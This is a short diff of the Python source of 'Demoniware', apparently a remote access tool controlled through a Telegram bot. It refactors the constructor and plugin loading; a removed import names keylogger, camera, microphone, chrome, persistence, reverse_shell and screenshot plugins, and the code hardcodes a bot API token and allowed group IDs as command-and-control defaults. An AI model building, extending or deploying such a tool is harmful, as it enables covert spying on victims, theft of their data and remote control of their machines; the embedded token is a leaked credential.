@@ -17,13 +17,12 @@ from Crypto.Hash import SHA256
 from threading import Thread
 
 from plugins import load_plugin
-from plugins import camera, chrome, download_upload, keylogger, microphone, persistence, proc, reverse_shell, screenshot, suicide, system
 
 
 class Demoniware(object):
 
 
-    def __init__(self, config_file, api_key=None, allowed_groups=None):
+    def __init__(self, api_key=None, allowed_groups=None):
         formatter = logging.Formatter('%(asctime)s %(message)s')
         self.logger = logging.getLogger(__name__)
         self.logger.setLevel(logging.DEBUG)
@@ -38,7 +37,7 @@ class Demoniware(object):
 
 
         self.api_key = api_key if api_key else '272769645:AAHaAlus1Bh4xMAJD7crcEwRpe7JxHpy6I0'
-        self.allowed_groups = allowed_groups if allowed_groups else [-167279752,-155034552]
+        self.allowed_groups = allowed_groups if allowed_groups else [-167279752]
         self.max_message_length = 4096
         self.socket_buffer_size = 1024
 
@@ -212,6 +211,6 @@ class Demoniware(object):
 
 if __name__ == "__main__":
 
-    demon = Demoniware('demoniware.ini')
-    demon.load_plugins('static')
+    demon = Demoniware()
+    demon.load_plugins('dynamic')
     demon.main()
